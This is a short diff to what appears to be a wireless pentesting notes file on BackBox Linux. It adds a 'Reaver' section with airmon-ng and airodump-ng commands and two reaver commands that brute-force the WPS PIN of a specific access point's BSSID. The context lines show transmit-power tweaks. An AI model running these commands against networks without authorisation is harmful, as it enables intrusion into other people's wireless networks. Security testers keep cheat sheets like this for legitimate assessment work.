@@ -66,6 +66,15 @@ root@backbox:/home/backbox# iwconfig wlan1 txpower 30
 root@backbox:/home/backbox# iwconfig wlan1 rate 11M auto
 
 
+Reaver
+------
+
+airmon-ng start wlan0
+airodump-ng wlan0
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1
+
+
 Wireless Notes
 --------------
 
